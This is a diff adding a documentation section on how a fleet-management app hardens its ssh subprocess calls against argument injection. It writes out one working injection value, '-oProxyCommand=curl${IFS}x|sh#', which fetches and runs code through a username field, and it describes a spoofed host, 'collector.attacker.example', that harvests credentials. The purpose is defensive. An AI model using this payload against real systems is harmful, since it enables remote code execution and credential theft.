@@ -732,3 +732,28 @@ All behind the console session (Bearer or cookie). Details:
   app toggles.
 - [`tests/integration/test_fleet.py`](../../tests/integration/test_fleet.py) —
   two real nodes, a real mesh.
+
+
+## Argv is not a shell, and that is the point
+
+Nothing the fleet app runs goes through a shell: every subprocess is
+`create_subprocess_exec` with an argv list, so there is no quoting to get wrong.
+What there *is* to get wrong is which argv element a value lands in.
+
+OpenSSH reads a leading `-` as an option, and `-o` takes its argument attached.
+A username pasted into `f"{user}@{host}"` therefore decided what ssh did:
+`-oProxyCommand=curl${IFS}x|sh#` has no whitespace, is under 64 characters, and
+ran through `/bin/sh`. So:
+
+- a username and a `sudo_user` must match `_ACCOUNT_RE` — a real account name;
+- a `key_path` must be absolute and must not start with `-` (`-i` takes a
+  separate element, so a dash there is an option of its own);
+- the destination is passed as `-l user host`, never glued, so no argv element
+  begins with a character the caller chose.
+
+The same rule applies to the **target address**. `ip` decides where a credential
+is offered, and it arrives from a managed node's LAN scan — a hostile one could
+answer `collector.attacker.example` under a label reading `192.168.1.42`, and
+the password typed for that deploy would go to whatever answered. It is
+validated as a literal address where the reply arrives *and* where the target is
+used; the label is shown beside the address, never instead of it.
